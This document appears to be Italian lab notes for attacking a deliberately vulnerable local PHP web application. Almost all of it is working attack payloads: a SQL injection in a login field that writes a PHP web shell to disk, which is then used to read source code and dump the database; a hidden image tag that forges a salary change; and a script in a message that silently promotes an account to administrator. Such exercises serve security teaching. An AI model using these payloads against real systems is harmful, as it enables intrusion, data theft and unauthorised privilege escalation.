
```
Introduzione e setup
http://localhost/ingsv/setup.php – redirect 

Attacco 1
Email:
' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3, 4, 5 INTO OUTFILE 'C:/xampp/htdocs/ingsv/backdoor.php' #
Password: Qualsiasi*
Accedi.

Codice Sorgente:
http://localhost/ingsv/backdoor.php?cmd=type%20login.php	

Accesso completo al Database:
http://localhost/ingsv/backdoor.php?cmd=C:\xampp\mysql\bin\mysqldump%20-u%20root%20vulnerabile


Attacco 2
Oggetto: Verifica Contabile
Messaggio:

<p>Amministratore, controlla qui...</p>
<img src='attacco_stipendio.php?nome=Anna&cognome=Bianchi&nuovo_stipendio=99000' style='width:0; height:0; display:none;'>

Attacco 3	
Oggetto: Errore Sistema
Messaggio:

<script>
  var url = '/ingsv/actions.php';
  var dati = 'action=update_ruolo&id=3&ruolo=Amministratore';
  fetch(url, {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: dati
  }).then(function() { console.clear(); });
</script>


```
